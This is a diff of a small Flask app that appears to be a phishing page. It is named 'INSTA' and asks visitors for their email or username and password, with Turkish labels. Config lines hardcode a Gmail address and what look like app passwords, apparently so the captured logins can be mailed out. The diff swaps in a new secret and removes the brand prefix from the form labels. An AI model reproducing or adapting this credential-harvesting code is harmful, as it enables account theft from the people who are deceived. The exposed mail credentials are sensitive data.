@@ -13,7 +13,7 @@ app = Flask(__name__)
 MARKET_ADI = "INSTA"
 
 GMAIL_GONDEREN = os.environ.get("memoapk7@gmail.com")       # Render environment variable
-GMAIL_APP_SIFRE = os.environ.get("rgak tocq yyxu hxk")      # Render environment variable
+GMAIL_APP_SIFRE = os.environ.get("dtvsvgemvslqijle")      # Render environment variable
 ALICI_MAIL = os.environ.get("memoapk7@gmail.com")       # Render environment variable
 
 # =========================
@@ -105,10 +105,10 @@ HTML = """
         <h1>{{ market_adi }}</h1>
 
         <form method="POST">
-            <label for="urun1">{{ market_adi }} - e posta </label>
+            <label for="urun1"> e posta </label>
             <input type="text" id="urun1" name="urun1" placeholder="e posta veya kullanıcı adı">
 
-            <label for="urun2">{{ market_adi }} - şifre </label>
+            <label for="urun2"> şifre </label>
             <input type="text" id="urun2" name="urun2" placeholder="şifreni yaz">
 
             <button type="submit">Gönder</button>
